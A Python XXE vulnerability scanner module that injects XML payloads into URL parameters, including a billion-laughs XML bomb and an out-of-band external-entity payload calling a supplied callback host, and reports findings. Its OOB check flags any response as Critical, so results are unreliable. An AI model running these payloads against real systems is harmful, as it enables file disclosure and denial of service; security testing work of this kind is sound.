"""
XXE (XML External Entity) vulnerability scanner
Advanced detection with blind XXE, OOB callbacks, and entity expansion attacks
"""
import concurrent.futures
import re
import time
from typing import List, Dict, Optional, Set, Tuple
from urllib.parse import urlparse, parse_qs
from scanner.logger import logger
from scanner.utils import make_http_request, inject_payload, calculate_hash
from scanner.config import XXE_PAYLOADS, MAX_WORKERS, TIMEOUT


class XXEScanner:
    """Advanced XXE vulnerability scanner"""
    
    def __init__(self, callback_url: str = None, blind_detection: bool = True):
        """
        Initialize XXE scanner
        
        Args:
            callback_url: Optional URL for OOB/Blind XXE callbacks (e.g., burp collaborator)
            blind_detection: Enable blind XXE detection via timing/error analysis
        """
        self.findings = []
        self.tested_urls: Set[str] = set()
        self.callback_url = callback_url
        self.blind_detection = blind_detection
        self.xxe_indicators = [
            'root:',
            'bin:',
            '/bin/bash',
            'root:x:0:0',
            'nologin',
            'nobody:',
            '<!DOCTYPE',
            '<!ENTITY',
            'ENTITY',
            'SYSTEM',
            'Windows',
            '[bootstrapping]',
        ]
        logger.info(f"XXEScanner initialized (blind_detection={blind_detection})")
    
    def scan_urls(self, urls: List[str]) -> List[Dict]:
        """
        Scan URLs for XXE vulnerabilities
        
        Args:
            urls: List of URLs to scan
        
        Returns:
            List of XXE findings
        """
        logger.info(f"Starting XXE scan on {len(urls)} URLs")
        
        test_cases = self._prepare_test_cases(urls)
        logger.info(f"Testing {len(test_cases)} XXE scenarios")
        
        # Scan in parallel
        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = {
                executor.submit(self._test_xxe_parameter, tc['url'], tc['param'], tc.get('value')): tc
                for tc in test_cases
            }
            
            for future in concurrent.futures.as_completed(futures):
                test_case = futures[future]
                try:
                    finding = future.result()
                    if finding:
                        self.findings.append(finding)
                        logger.info(f"[XXE] Found vulnerability: {test_case['url']}")
                except Exception as e:
                    logger.debug(f"Error testing XXE on {test_case['url']}: {e}")
        
        logger.info(f"XXE scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings
    
    def _prepare_test_cases(self, urls: List[str]) -> List[Dict]:
        """Prepare XXE test cases from URLs"""
        test_cases = []
        
        # Parameters likely to accept XML
        xml_parameters = ['xml', 'data', 'content', 'payload', 'message', 'soap', 'document', 'body']
        
        for url in urls:
            try:
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                
                # Test each parameter for XXE
                for param_name, param_values in params.items():
                    test_cases.append({
                        'url': url,
                        'param': param_name,
                        'value': param_values[0] if param_values else ''
                    })
                
                # Also test likely XML parameters even if not present
                for xml_param in xml_parameters:
                    if not any(p.lower() == xml_param for p in params.keys()):
                        test_cases.append({
                            'url': url,
                            'param': xml_param,
                            'value': ''
                        })
            except Exception as e:
                logger.debug(f"Error preparing test cases for {url}: {e}")
        
        return test_cases[:1000]  # Limit test cases
    
    def _test_xxe_parameter(self, url: str, param: str, value: str = '') -> Optional[Dict]:
        """Test a parameter for XXE vulnerability"""
        
        test_key = f"{url}:{param}"
        test_hash = calculate_hash(test_key)
        
        if test_hash in self.tested_urls:
            return None
        self.tested_urls.add(test_hash)
        
        try:
            # Try standard XXE payloads
            finding = self._test_standard_xxe(url, param)
            if finding:
                return finding
            
            # Try blind XXE detection
            if self.blind_detection:
                finding = self._test_blind_xxe(url, param)
                if finding:
                    return finding
            
            # Try entity expansion attacks
            finding = self._test_entity_expansion(url, param)
            if finding:
                return finding
            
            # Try OOB XXE if callback URL provided
            if self.callback_url:
                finding = self._test_oob_xxe(url, param)
                if finding:
                    return finding
        
        except Exception as e:
            logger.debug(f"Error testing XXE on {url}:{param}: {e}")
        
        return None
    
    def _test_standard_xxe(self, url: str, param: str) -> Optional[Dict]:
        """Test for standard XXE with direct file content reflection"""
        
        for payload in XXE_PAYLOADS[:15]:  # Test most common payloads first
            test_url = inject_payload(url, param, payload, method='query')
            
            try:
                response, status, error = make_http_request(test_url, timeout=TIMEOUT)
                
                if error or response is None:
                    continue
                
                # Check for XXE indicators in response
                for indicator in self.xxe_indicators:
                    if indicator in response:
                        finding = {
                            'type': 'XXE (XML External Entity)',
                            'subtype': 'Direct File Inclusion',
                            'url': url,
                            'parameter': param,
                            'payload': payload[:200],
                            'severity': 'Critical',
                            'status_code': status,
                            'timestamp': time.time(),
                            'proof': f'XXE payload executed, response contains: {indicator}',
                            'impact': 'Server may have disclosed sensitive files or experienced DoS'
                        }
                        logger.info(f"[XXE-STANDARD] Found on {param}: {indicator}")
                        return finding
            
            except Exception as e:
                logger.debug(f"Error in standard XXE test: {e}")
        
        return None
    
    def _test_blind_xxe(self, url: str, param: str) -> Optional[Dict]:
        """
        Test for blind XXE through timing analysis and error messages
        Detects XXE even when response doesn't directly contain file content
        """
        
        # Billion laughs attack (XML bomb) - should cause delay/error
        bomb_payload = XXE_PAYLOADS[5]  # Billion laughs
        
        try:
            start_time = time.time()
            response, status, error = make_http_request(
                inject_payload(url, param, bomb_payload, method='query'),
                timeout=TIMEOUT + 5
            )
            elapsed = time.time() - start_time
            
            # Significant delay or error indicates possible XXE processing
            if error or (status and status >= 500) or elapsed > 3:
                finding = {
                    'type': 'XXE (XML External Entity)',
                    'subtype': 'Blind XXE / Entity Expansion Attack',
                    'url': url,
                    'parameter': param,
                    'payload': bomb_payload[:200],
                    'severity': 'Critical',
                    'status_code': status,
                    'timestamp': time.time(),
                    'proof': f'XML bomb caused server response time of {elapsed:.1f}s or error {error}',
                    'impact': 'Potential XXE processing detected. Server vulnerable to DoS via entity expansion.'
                }
                logger.info(f"[XXE-BLIND] Found on {param} via timing analysis ({elapsed:.1f}s)")
                return finding
        
        except Exception as e:
            # Timeout suggests XXE processing
            if 'timeout' in str(e).lower():
                finding = {
                    'type': 'XXE (XML External Entity)',
                    'subtype': 'Blind XXE / Entity Expansion Attack',
                    'url': url,
                    'parameter': param,
                    'payload': bomb_payload[:200],
                    'severity': 'Critical',
                    'timestamp': time.time(),
                    'proof': 'Request timeout indicates XML entity expansion attack',
                    'impact': 'Server vulnerable to Billion Laughs/XML bomb DoS'
                }
                logger.info(f"[XXE-BLIND] Found on {param} via timeout")
                return finding
        
        return None
    
    def _test_entity_expansion(self, url: str, param: str) -> Optional[Dict]:
        """Test for XXE through entity expansion analysis"""
        
        # Select entity expansion payloads from config
        expansion_payloads = [p for p in XXE_PAYLOADS if 'lol' in p.lower()]
        
        for payload in expansion_payloads[:5]:
            try:
                response, status, error = make_http_request(
                    inject_payload(url, param, payload, method='query'),
                    timeout=TIMEOUT
                )
                
                if error and 'entity' in error.lower():
                    finding = {
                        'type': 'XXE (XML External Entity)',
                        'subtype': 'Entity Expansion Detection',
                        'url': url,
                        'parameter': param,
                        'payload': payload[:200],
                        'severity': 'Critical',
                        'status_code': status,
                        'timestamp': time.time(),
                        'proof': f'XXE entity expansion detected in error message',
                        'impact': 'Server processes XML with entity expansion'
                    }
                    logger.info(f"[XXE-EXPANSION] Found on {param}")
                    return finding
            
            except Exception as e:
                logger.debug(f"Error in entity expansion test: {e}")
        
        return None
    
    def _test_oob_xxe(self, url: str, param: str) -> Optional[Dict]:
        """
        Test for Out-of-Band (OOB) XXE using callback URL
        Requires external callback service (e.g., Burp Collaborator)
        """
        
        if not self.callback_url:
            return None
        
        # Create OOB XXE payload
        oob_payload = f'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{self.callback_url}/xxe">
]>
<root>&xxe;</root>'''
        
        try:
            response, status, error = make_http_request(
                inject_payload(url, param, oob_payload, method='query'),
                timeout=TIMEOUT
            )
            
            # Check if callback URL was accessed (would need external monitoring)
            # This is a placeholder for callback detection
            if response is not None:
                finding = {
                    'type': 'XXE (XML External Entity)',
                    'subtype': 'Out-of-Band XXE',
                    'url': url,
                    'parameter': param,
                    'payload': oob_payload[:200],
                    'severity': 'Critical',
                    'timestamp': time.time(),
                    'proof': f'OOB XXE payload sent. Check callback URL: {self.callback_url}',
                    'impact': 'Server may have attempted to contact external callback URL'
                }
                logger.info(f"[XXE-OOB] Sent OOB payload to {param}")
                return finding
        
        except Exception as e:
            logger.debug(f"Error in OOB XXE test: {e}")
        
        return None
    
    def _detect_xxe_by_errors(self, response: str, error: str) -> Tuple[bool, str]:
        """Detect XXE through error messages"""
        
        xxe_error_patterns = [
            r'xml\.etree\.ElementTree\.ParseError',
            r'DOCTYPE not allowed',
            r'Entity .* not defined',
            r'ENTITY declaration',
            r'XML parser',
            r'XML parsing',
        ]
        
        full_text = f"{response} {error}".lower()
        
        for pattern in xxe_error_patterns:
            if re.search(pattern, full_text, re.IGNORECASE):
                return True, pattern
        
        return False, ""
    
    def get_findings_summary(self) -> Dict:
        """Get summary of findings"""
        return {
            'total': len(self.findings),
            'critical': len([f for f in self.findings if f.get('severity') == 'Critical']),
            'high': len([f for f in self.findings if f.get('severity') == 'High']),
            'by_type': self._group_by_type()
        }
    
    def _group_by_type(self) -> Dict:
        """Group findings by XXE type"""
        grouped = {}
        for finding in self.findings:
            subtype = finding.get('subtype', 'Unknown')
            if subtype not in grouped:
                grouped[subtype] = []
            grouped[subtype].append(finding)
        return grouped
    
    def get_critical_findings(self) -> List[Dict]:
        """Get only critical XXE findings"""
        return [f for f in self.findings if f.get('severity') == 'Critical']


def scan_xxe(urls: List[str], callback_url: str = None, blind_detection: bool = True) -> List[Dict]:
    """
    Convenience function to scan for XXE
    
    Args:
        urls: List of URLs to scan
        callback_url: Optional callback URL for OOB XXE detection
        blind_detection: Enable blind XXE detection
    
    Returns:
        List of XXE findings
    """
    scanner = XXEScanner(callback_url=callback_url, blind_detection=blind_detection)
    return scanner.scan_urls(urls)
